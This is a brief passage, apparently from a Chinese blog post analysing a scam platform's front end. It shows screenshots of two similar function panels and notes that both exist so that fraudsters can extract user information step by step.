![front-jieliuzi-func-1](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143906996-1183579734.png)





![front-jieliuzi-func-2](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143909644-1805558719.png)



两列功能类似，只有个别区别，这里贴个图对比一下，感觉功能 2 应该是 1 的升级版，多加了几个功能，不过后面发现并不是这么简单，二者都能使用，这样是为了方便骗子连环套取用户信息：



![front-jieliuzi-func-compare](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143911213-450403041.png)